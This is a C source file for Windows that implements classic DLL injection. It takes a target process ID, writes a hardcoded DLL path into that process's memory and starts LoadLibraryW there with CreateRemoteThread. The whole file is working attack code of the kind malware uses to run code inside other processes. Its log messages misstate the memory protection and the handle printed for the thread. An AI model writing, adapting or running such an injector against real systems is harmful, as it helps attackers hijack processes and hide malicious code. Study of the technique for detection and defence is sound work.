#include<windows.h>
#include<stdio.h>

const char* oky = "\033[1;32m[+] ";
const char* wrn = "\033[1;31m[*] ";
const char* inf = "\033[1;34m[!] ";
const char* cls = "\033[0m\n";


DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;
HMODULE hKernel32 = NULL;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\rishi\\inject\\DLLInjection\\DllMaker.dll";
size_t dllPathSize = sizeof(dllPath);


int main(int argc, char* argv[]) {

	if (argc < 2) {

		printf("%s Format is program.exe <PID> %s", wrn, cls);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	printf("%s trying to open a handle to process (%ld)%s", inf, PID, cls);

	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		PID
	);

	if (hProcess == NULL) {
		printf("%s Could not create a handle for the process (ERROR  ==  %ld)%s", wrn, GetLastError(), cls);
		return EXIT_FAILURE;
	}
	printf("%s Got a handle to the process! \n\\---0x%p %s", oky, hProcess, cls);



	rBuffer = VirtualAllocEx(
		hProcess, NULL,
		dllPathSize, (MEM_COMMIT | MEM_RESERVE),
		PAGE_READWRITE
	);
	if (rBuffer == NULL) {
		printf("%s Could not create a buffer for the process (ERROR  ==  %ld)%s", wrn, GetLastError(), cls);
		return EXIT_FAILURE;
	}
	printf("%s allocated %zu-bytes with PAGE_EXECUTEREADWRITE permissions %s", oky, dllPathSize, cls);

	WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL);
	printf("%s written %S to process memory %s", oky, dllPath	, cls);

	hKernel32 = GetModuleHandleW(L"Kernel32");

	if (hKernel32 == NULL) {
		printf("%s Could not create a handle for the Kernel32.dll (ERROR  ==  %ld)%s", wrn, GetLastError(), cls);
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("%s Got a handle to the Kernel32.dll\n\\---0x%p\n %s",oky, hKernel32, cls);

	LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	printf("%s Got the address of LoadLibrary()\n\\---0x%p %s",oky,startThis,cls);

	hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TID);
	if (hThread == NULL) {
		printf("%s Could not create a handle for the thread (ERROR  ==  %ld)%s", wrn, GetLastError(), cls);
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("%s Got a handle to the newly created thread\n\\---0x%p\n %s", oky, hKernel32, cls);
	printf("%s Executing %s", inf, cls);

	WaitForSingleObject(hThread, INFINITE);

	printf("%s DONE %s", oky, cls);
	printf("%s Thread is done executing, Cleaning up now %s", inf, cls);

	CloseHandle(hProcess);
	CloseHandle(hThread);


	return EXIT_SUCCESS;
}

